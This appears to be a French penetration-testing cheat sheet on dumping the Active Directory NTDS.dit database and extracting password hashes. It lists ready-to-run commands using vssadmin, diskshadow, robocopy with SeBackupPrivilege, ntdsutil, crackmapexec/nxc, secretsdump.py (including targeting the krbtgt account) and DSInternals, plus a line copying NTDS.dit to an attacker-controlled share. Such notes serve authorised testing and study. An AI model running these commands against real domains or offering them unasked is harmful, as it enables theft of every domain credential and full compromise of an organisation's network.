---
public: true
---
## Dump d'NTDS.dit
### Localement

#### Cliché instantané (vssadmin)

##### Créer une Shadow Copy (cliché instantanné) du disque C

La base NTDS.dit est par défaut stockée dans `C:\Windows\NTDS`

```
vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

##### Copier à partir du cliché instantanné

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<Attacker_IP>\share\
```

#### Cliché instantanné (diskshadow.exe)

##### Créer une Shadow Copy (cliché instantanné) du disque C

```shell
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

##### Copier à partir du cliché instantanné

**Remarque** :  Si le fichier n'est pas accessible et que l'on est membre du groupe *Backup Operator*, on pourra y accéder via le privilège **SeBackupPrivilege** (voir [[Exploitation des privilèges Windows]])

```
# cas 1 : Robocopy "sait" utiliser le privilège SeBackupPrivilege
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

# cas 2 : sans robocopy, ce cmdlet est lié à un outil référencé dans le lien ci-dessus
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

#### Création d'une sauvegarde via ntdsutil (non testé)

Le fichier créé dans ce format pourra par la suite être exploité pour fournir des métriques sur différents éléments liés aux mots de passe et leur robuster via l'outil Domain Password Audit Tool (DPAT) <https://github.com/clr2of8/DPAT>

```shell
ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q
```

### A distance

```
## utilise à distance ntdsutil
nxc smb ip -u user -p pass -M ntdsutil

crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds

secretsdump.py -just-dc-user $AD_DOMAIN/krbtgt  $AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP

```

## Extraction des informations d'identification (credentials)

## Localement
### Extraction des informations présentes dans NTDS.dit via DSInternals

```powershell-session
# https://github.com/MichaelGrafnetter/DSInternals/releases/download/v4.12/DSInternals_v4.12.zip
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key


```

### A distance
#### Extraction des hash d'un dump NTDS.dit via secretsdump.py

Prérequis : disposer d'NTDS.dit et du dump SYSTEM via `reg save HKLM\SYSTEM SYSTEM.SAV`

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.sav -hashes lmhash:nthash LOCAL
```
